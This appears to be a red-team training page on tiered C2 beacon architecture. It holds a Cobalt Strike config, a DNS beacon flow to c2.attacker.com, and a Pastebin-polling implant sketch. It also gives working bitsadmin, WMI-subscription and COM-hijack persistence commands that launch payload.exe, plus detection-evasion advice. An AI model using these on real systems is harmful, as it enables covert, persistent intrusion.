---
layout: training-page
title: "C2 Tiered Architecture — Red Team Academy"
module: "C2 Frameworks"
tags:
  - c2
  - beacon
  - tiered-architecture
  - opsec
  - persistence
page_key: "c2-frameworks-tiered-architecture"
render_with_liquid: false
---

# C2 Tiered Architecture

Professional red team operations use a multi-tier C2 architecture to achieve resilience, stealth, and operational separation. A single beacon that calls back to a team server is fragile — one burned indicator kills the engagement. A tiered system has multiple implants with different beacon intervals, protocols, and roles. Losing Tier 1 doesn't mean losing the target.

---

## The Three-Tier Model

```
                     [Attacker]
                         |
              ┌──────────┼──────────┐
              |          |          |
           Tier 1     Tier 2     Tier 3
        Interactive  Short Haul  Long Haul
         (30s-2m)    (1h-12h)   (24h-72h+)
              |          |          |
           [Target Network / Compromised Host]
```

Each tier serves a different purpose and uses different protocols, beacon intervals, and persistence mechanisms.

---

## Tier 1 — Interactive Beacon

The primary working implant. Used for active operations: lateral movement, data collection, privilege escalation.

```
Beacon interval:  30 seconds – 2 minutes
Jitter:           ±20–30% randomization
Protocol:         HTTP(S), SMB (peer-to-peer), TCP
Persistence:      None preferred (avoid noise), or lightweight run key
Lifetime:         Active engagement hours — expect to lose this
```

**Operational role:**
- Active command execution
- File upload/download
- Lateral movement pivoting
- Receives frequent tasking

**OPSEC posture:**
- Malleable C2 profile — blend with legitimate traffic (OneDrive, Teams, Salesforce CDN)
- Sleep jitter to avoid predictable beaconing patterns
- Use encrypted channels (HTTPS with valid cert)
- Parent process spoofing to disguise the spawned process

```
# Cobalt Strike: short beacon example
set sleeptime "60000";     # 60s base
set jitter     "20";        # ±20%
set useragent  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
```

---

## Tier 2 — Short Haul Beacon

A medium-persistence implant that activates when Tier 1 is burned. Beacon intervals are long enough to evade behavior-based detection but short enough to recover the engagement within hours.

```
Beacon interval:  1 hour – 12 hours
Jitter:           ±30–50%
Protocol:         DNS, HTTPS, cloud storage API (Dropbox, Pastebin, GitHub Gist)
Persistence:      Scheduled task, WMI subscription, registry run key
Lifetime:         Days to weeks
```

**Operational role:**
- Recovery channel after Tier 1 burn
- Re-establish foothold and re-deploy Tier 1
- Covert communication at low frequency

**Protocol choice — DNS:**
DNS beaconing is difficult to block without breaking legitimate resolution. Use DNS TXT record queries to encode commands:

```
beacon → DNS TXT query to c2.attacker.com → returns encoded command
response → DNS A record encodes status → returned to team server
```

**Protocol choice — Cloud API:**
Encode commands as content in Dropbox files or Pastebin pastes. The implant polls on a schedule:

```python
# Simplified concept: implant polls a Pastebin paste for commands
import requests, base64, time

PASTE_URL = "https://pastebin.com/raw/xxxxxx"
while True:
    r = requests.get(PASTE_URL)
    cmd = base64.b64decode(r.text.strip()).decode()
    if cmd != "NOP":
        # execute cmd
        pass
    time.sleep(3600 + random.randint(-600, 600))  # 1h ± 10m
```

---

## Tier 3 — Long Haul Beacon

A near-silent implant designed to survive for weeks or months without triggering detection. It exists solely to re-establish Tier 2 after a complete infrastructure burn.

```
Beacon interval:  24 hours – 72 hours (or longer)
Jitter:           ±50% or randomized window
Protocol:         HTTPS to CDN/cloud, ICMP (covert), steganographic channels
Persistence:      Boot-time driver, COM hijack, BITS job, WMI permanent subscription
Lifetime:         Months
```

**Operational role:**
- Passive watchdog — waits for signal to activate
- Re-deploy Tier 2 infrastructure after burn
- Survives incident response (unless full reimaging occurs)

**Watchdog logic:**
```
while true:
    if receive("activate"):
        deploy_tier2_beacon()
        notify_operator()
    sleep(random_24h_to_72h)
```

**Persistence mechanisms for long-haul:**

```
# BITS job (Background Intelligent Transfer Service)
bitsadmin /create /download /priority normal watchdog
bitsadmin /setnotifycmdline watchdog "cmd.exe" "/c payload.exe"
bitsadmin /setminretrydelay watchdog 86400  # retry daily

# WMI permanent event subscription
# Fires on system start without visible run key or scheduled task
wmic /namespace:"\\root\subscription" path __EventFilter CREATE Name="BootFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 200 AND TargetInstance.SystemUpTime &lt; 320"
wmic /namespace:"\\root\subscription" path CommandLineEventConsumer CREATE Name="BootConsumer", ExecutablePath="C:\Windows\Temp\payload.exe", CommandLineTemplate="C:\Windows\Temp\payload.exe"
wmic /namespace:"\\root\subscription" path __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BootFilter\"", Consumer="CommandLineEventConsumer.Name=\"BootConsumer\""

# COM hijack (HKCU, no admin required)
HKCU\Software\Classes\CLSID\{GUID}\InprocServer32 = C:\path\to\payload.dll
```

---

## Multi-Tier Deployment Checklist

```
Infrastructure separation:
  [ ] Each tier uses different VPS providers / cloud accounts
  [ ] Separate domain registrars and registration details per tier
  [ ] Redirectors in front of every team server
  [ ] No IP overlap between tiers

Implant separation:
  [ ] Tier 1: compiled with different keys/configs than Tier 2/3
  [ ] Different C2 frameworks per tier (e.g., Cobalt Strike Tier1, Havoc Tier2)
  [ ] Unique payloads — reusing the same binary across tiers allows attribution

Operational hygiene:
  [ ] Deploy Tier 3 on Day 1, before any offensive action
  [ ] Deploy Tier 2 on Day 1 with long-haul persistence
  [ ] Use Tier 1 for active work; kill it and re-spawn from Tier 2 as needed
  [ ] Never issue Tier 3 tasking from compromised infrastructure
```

---

## Beacon Interval Strategy

| Tier | Base Interval | Jitter | Detection Risk |
|------|-------------|--------|---------------|
| Tier 1 | 60s | ±20% | High (accepted for active ops) |
| Tier 2 | 4h | ±40% | Low |
| Tier 3 | 48h | ±50% | Very low |

**Why jitter matters:** A beacon arriving at exactly 60.000s every call is a trivial pattern-match for SIEM rules. With 20% jitter, arrivals occur anywhere between 48s and 72s — a statistical spread that blends with normal polling traffic.

---

## Fallback Implant Logic

Implement watchdog logic in Tier 1 so it automatically re-deploys itself from Tier 2 if communications fail:

```
Tier 1 logic:
  if no operator activity for 4 hours:
    signal Tier 2 to re-deploy Tier 1
    self-terminate

Tier 2 logic:
  on signal from Tier 1 (or after timeout):
    download fresh Tier 1 payload from staging server
    execute and establish new callback
    notify operator of re-deployment
```

---

## Resources

- Cobalt Strike Malleable C2 profiles — `github.com/rsmudge/Malleable-C2-Profiles`
- C2 Matrix (framework comparison) — `thec2matrix.com`
- MITRE ATT&CK TA0011 — Command and Control — `attack.mitre.org/tactics/TA0011/`
- Nighthawk C2 tiered implant model — `mdsec.co.uk/nighthawk/`
- Red Team Infrastructure Wiki (bluscreenofjeff) — `github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki`
